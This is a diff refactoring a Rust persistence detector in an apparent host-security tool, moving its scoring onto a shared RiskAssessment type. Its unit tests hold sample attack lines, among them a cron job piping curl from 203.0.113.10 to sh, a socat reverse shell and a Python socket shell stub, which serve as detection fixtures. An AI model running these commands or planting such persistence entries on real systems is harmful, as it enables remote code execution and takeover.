@@ -1,8 +1,8 @@
 use crate::detectors::command_profile::assess_network_execution_command;
+use crate::detectors::risk::RiskAssessment;
 use crate::detectors::{evidence, string_field, DetectContext, Detector};
 use crate::rules::model::RuleMetadata;
 use sentinel_core::{Category, Finding, RawEvent, Severity};
-use std::collections::BTreeSet;
 
 pub struct PersistenceDetector;
 
@@ -82,11 +82,7 @@ fn persistence_changed(event: &RawEvent, ctx: &DetectContext) -> Finding {
     ])
 }
 
-fn suspicious_entry(
-    event: &RawEvent,
-    ctx: &DetectContext,
-    assessment: PersistenceEntryAssessment,
-) -> Finding {
+fn suspicious_entry(event: &RawEvent, ctx: &DetectContext, assessment: RiskAssessment) -> Finding {
     let path = string_field(event, "path");
     Finding::new(
         &ctx.host_id,
@@ -115,82 +111,60 @@ fn suspicious_entry(
     ])
 }
 
-#[derive(Debug, Clone, Default)]
-struct PersistenceEntryAssessment {
-    score: u16,
-    reasons: BTreeSet<String>,
-    features: BTreeSet<&'static str>,
-}
-
-impl PersistenceEntryAssessment {
-    fn is_suspicious(&self, min_score: u16) -> bool {
-        self.score >= min_score
-    }
-
-    fn absorb(&mut self, line: &str) {
-        let line_assessment = assess_persistence_line(line);
-        self.score = self.score.max(line_assessment.score);
-        self.reasons.extend(line_assessment.reasons);
-        self.features.extend(line_assessment.features);
-    }
-
-    fn reason_text(&self) -> String {
-        self.reasons.iter().cloned().collect::<Vec<_>>().join("; ")
-    }
-
-    fn feature_names(&self) -> String {
-        self.features.iter().copied().collect::<Vec<_>>().join(", ")
-    }
-}
-
-fn assess_persistence_entry(event: &RawEvent) -> PersistenceEntryAssessment {
-    let mut assessment = PersistenceEntryAssessment::default();
+fn assess_persistence_entry(event: &RawEvent) -> RiskAssessment {
+    let mut assessment = RiskAssessment::default();
     for line in string_field(event, "suspicious_lines").lines() {
-        assessment.absorb(line);
+        absorb_persistence_line(&mut assessment, line);
     }
     assessment
 }
 
-fn assess_persistence_line(line: &str) -> PersistenceEntryAssessment {
+fn absorb_persistence_line(assessment: &mut RiskAssessment, line: &str) {
+    assessment.merge_max(assess_persistence_line(line));
+}
+
+fn assess_persistence_line(line: &str) -> RiskAssessment {
     let command = persistence_command_text(line);
     let lowered = command.to_ascii_lowercase();
-    let mut assessment = PersistenceEntryAssessment::default();
+    let mut assessment = RiskAssessment::default();
 
     let network_assessment = assess_network_execution_command(command);
     if network_assessment.is_suspicious() {
-        assessment.score = assessment.score.max(90);
-        assessment.reasons.insert(network_assessment.reason_text());
-        assessment.features.insert("network_execution_bridge");
+        assessment.add_signal(
+            90,
+            "network_execution_bridge",
+            network_assessment.reason_text(),
+        );
     }
 
     if contains_temp_payload_path(&lowered) {
-        assessment.score = assessment.score.max(80);
-        assessment
-            .reasons
-            .insert("startup command references a temporary executable path".to_string());
-        assessment.features.insert("temporary_path");
+        assessment.add_signal(
+            80,
+            "temporary_path",
+            "startup command references a temporary executable path",
+        );
     }
 
     let downloader = contains_command_word(&lowered, &["curl", "wget"]);
     let pipe_to_shell = contains_pipe_to_shell(&lowered);
     if downloader && pipe_to_shell {
-        assessment.score = assessment.score.max(85);
-        assessment
-            .reasons
-            .insert("startup command downloads data and pipes it to a shell".to_string());
-        assessment.features.insert("download_to_shell");
+        assessment.add_signal(
+            85,
+            "download_to_shell",
+            "startup command downloads data and pipes it to a shell",
+        );
     }
 
     if contains_base64_decode(&lowered) && (pipe_to_shell || lowered.contains("eval")) {
-        assessment.score = assessment.score.max(80);
-        assessment
-            .reasons
-            .insert("startup command decodes payload data before shell execution".to_string());
-        assessment.features.insert("encoded_shell_payload");
+        assessment.add_signal(
+            80,
+            "encoded_shell_payload",
+            "startup command decodes payload data before shell execution",
+        );
     }
 
     if is_shell_wrapper_only(&lowered) {
-        assessment.features.insert("shell_wrapper");
+        assessment.add_feature("shell_wrapper");
     }
 
     assessment
@@ -279,21 +253,21 @@ mod tests {
         let assessment =
             assess_persistence_line("ExecStart=/bin/bash -c 'read args <&3; echo args=$args'");
         assert!(!assessment.is_suspicious(70));
-        assert!(assessment.features.contains("shell_wrapper"));
+        assert!(assessment.has_feature("shell_wrapper"));
     }
 
     #[test]
     fn persistence_risk_model_detects_download_to_shell() {
         let assessment = assess_persistence_line("* * * * * curl http://203.0.113.10/x | sh");
         assert!(assessment.is_suspicious(70));
-        assert!(assessment.features.contains("download_to_shell"));
+        assert!(assessment.has_feature("download_to_shell"));
     }
 
     #[test]
     fn persistence_risk_model_detects_temp_autostart_payload() {
         let assessment = assess_persistence_line("@reboot /dev/shm/.x");
         assert!(assessment.is_suspicious(70));
-        assert!(assessment.features.contains("temporary_path"));
+        assert!(assessment.has_feature("temporary_path"));
     }
 
     #[test]
@@ -301,7 +275,7 @@ mod tests {
         let assessment =
             assess_persistence_line("ExecStart=socat TCP:203.0.113.10:4444 EXEC:/bin/sh,pty");
         assert!(assessment.is_suspicious(70));
-        assert!(assessment.features.contains("network_execution_bridge"));
+        assert!(assessment.has_feature("network_execution_bridge"));
     }
 
     #[test]
@@ -310,7 +284,7 @@ mod tests {
             "ExecStart=python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0); os.system(\"/bin/sh\")'",
         );
         assert!(assessment.is_suspicious(70));
-        assert!(assessment.features.contains("network_execution_bridge"));
+        assert!(assessment.has_feature("network_execution_bridge"));
     }
 
     #[test]
